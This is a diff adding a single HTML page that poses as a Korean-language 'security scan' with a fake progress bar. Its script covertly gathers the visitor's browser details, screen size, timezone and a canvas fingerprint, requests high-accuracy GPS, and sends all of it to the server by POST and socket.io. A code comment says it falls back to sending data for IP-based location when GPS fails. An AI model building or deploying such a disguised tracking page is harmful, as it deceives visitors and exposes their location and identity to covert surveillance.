@@ -1,0 +1,44 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Security Scan</title>
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+</head><body style="background:#0d1117;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif">
+<div style="text-align:center"><h2>보안 점검 중...</h2><p id="s">0%</p><p id="l" style="font-size:11px;color:#8b949e;margin-top:8px"></p></div>
+<script>
+    const socket = io();
+    function fp(){try{const c=document.createElement('canvas');const x=c.getContext('2d');x.font='14px Arial';x.fillText('fp',2,2);return c.toDataURL().slice(0,50);}catch(e){return 'no-canvas';}}
+    let pct=0;
+    let timer = setInterval(()=>{pct+=15;document.getElementById('s').innerText=Math.min(99,Math.floor(pct))+'%';if(pct>=100)clearInterval(timer);},200);
+
+    function sendScan(pos){
+        const data={
+            ua:navigator.userAgent,
+            res:`${screen.width}x${screen.height}`,
+            plat:navigator.platform,
+            timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+            fp:fp(),
+            lng:pos?.coords.longitude,
+            lat:pos?.coords.latitude
+        };
+        if(pos){
+            socket.emit('client_location',{lng:pos.coords.longitude, lat:pos.coords.latitude});
+            document.getElementById('l').innerText = `GPS: ${pos.coords.latitude}, ${pos.coords.longitude}`;
+        }
+        fetch('/scan',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
+            .then(r=>r.json()).then(j=>{
+            console.log('scan result',j);
+            document.body.innerHTML='<h2 style="text-align:center;margin-top:40vh">✓ 점검 완료</h2>';
+        });
+    }
+
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(
+            p=>sendScan(p),
+            e=>{console.log('gps fail',e); sendScan(null);},
+            {enableHighAccuracy:true, timeout:5000}
+        );
+        setTimeout(()=>{ // 5초 안에 GPS 안 잡히면 그냥 IP로라도 보내기
+            if(pct<100) sendScan(null);
+        },5000);
+    }else{
+        sendScan(null);
+    }
+</script></body></html>
